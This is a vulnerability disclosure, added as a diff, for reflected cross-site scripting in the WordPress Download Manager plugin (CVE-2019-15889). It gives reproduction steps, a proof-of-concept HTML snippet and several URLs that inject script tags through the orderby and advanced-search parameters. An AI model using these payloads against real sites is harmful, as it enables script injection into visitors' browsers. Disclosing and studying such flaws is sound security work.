@@ -1,0 +1,47 @@
+* Exploit Title: WordPress Download Manager Cross-site Scripting
+* Discovery Date: 2019-04-13
+* Exploit Author: ThuraMoeMyint
+* Author Link: https://twitter.com/mgthuramoemyint
+* Vendor Homepage: https://www.wpdownloadmanager.com
+* Software Link: https://wordpress.org/plugins/download-manager
+* Version: 2.9.93
+* Category: WebApps, WordPress
+CVE:CVE-2019-15889
+Description
+--
+
+In the pro features of the WordPress download manager plugin, there is
+a Category Short-code feature witch can use to sort categories with
+order by a function which will be used as ?orderby=title,publish_date
+.
+By adding parameter "> and add any XSS payload , the xss payload will execute.
+
+To reproduce,
+
+1.Go to the link where we can find ?orderby
+2.Add parameters >” and give simple payload like <script>alert(1)</script>
+3.The payload will execute.
+--
+
+PoC
+--
+
+ <div class="btn-group btn-group-sm pull-right"><button type="button"
+class="btn btn-primary" disabled="disabled">Order &nbsp;</button><a
+class="btn btn-primary"
+href="https://server/wpdmpro/category-short-code/?orderby=publish_date\"><script>alert(11)</script>&order=asc">Asc</a><a
+class="btn btn-primary"
+href="https://server/wpdmpro/category-short-code/?orderby=publish_date\"><script>alert(11)</script>&order=desc">Desc</a></div>
+
+--
+Demo
+--
+https://server/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc
+--
+
+
+Another reflected cross-site scripting via advance search
+
+https://server/wpdmpro/advanced-search/
+
+https://server/wpdmpro/advanced-search/?search[publish_date]=2019-04-17+to+2019-04-17%22%3E%3Cscript%3Ealert(1)%3C/script%3E&search[update_date]=&search[view_count]=&search[download_count]=&search[package_size]=&search[order_by]=&search[order]=ASC&q=a
